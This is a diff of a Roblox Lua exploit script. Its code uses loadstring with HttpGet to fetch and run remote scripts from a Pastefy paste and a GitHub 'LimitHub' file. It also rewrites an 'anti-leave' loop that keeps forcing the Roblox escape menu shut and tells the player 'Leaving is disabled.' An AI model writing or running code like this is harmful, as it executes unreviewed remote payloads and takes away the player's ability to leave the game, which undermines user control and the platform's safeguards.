@@ -1,4 +1,4 @@
--- 1. Run Pastefy first
+-- Run Pastefy first
 local success1, err1 = pcall(function()
     loadstring(game:HttpGet("https://pastefy.app/8JqD2ajb/raw"))()
 end)
@@ -10,36 +10,24 @@ else
 end
 
 
--- 2. Anti-Leave Menu Program
-local CoreGui = game:GetService("CoreGui")
-
-local function closeMenu()
-    local robloxGui = CoreGui:FindFirstChild("RobloxGui")
-    if robloxGui then
-        local menuMainFrame = robloxGui:FindFirstChild("MenuMainFrame", true)
-        if menuMainFrame and menuMainFrame.Visible then
-            menuMainFrame.Visible = false
-            menuMainFrame:Destroy()
-            print("[BLOCKED] Leave menu closed.")
+-- Anti-Leave System (closes Roblox menu instantly)
+local GuiService = game:GetService("GuiService")
+spawn(function()
+    while true do
+        task.wait(0.1)
+        if GuiService.MenuIsOpen then
+            GuiService.MenuIsOpen = false
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "Blocked!";
+                Text = "Leaving is disabled.";
+                Duration = 2;
+            })
         end
     end
-end
-
--- Detect when menu is created
-CoreGui.ChildAdded:Connect(function()
-    closeMenu()
-end)
-
--- Constant check in case it reappears
-task.spawn(function()
-    while true do
-        closeMenu()
-        task.wait(0.1)
-    end
 end)
 
 
--- 3. Run LimitHub last
+-- Run LimitHub last
 local success2, err2 = pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua"))()
 end)
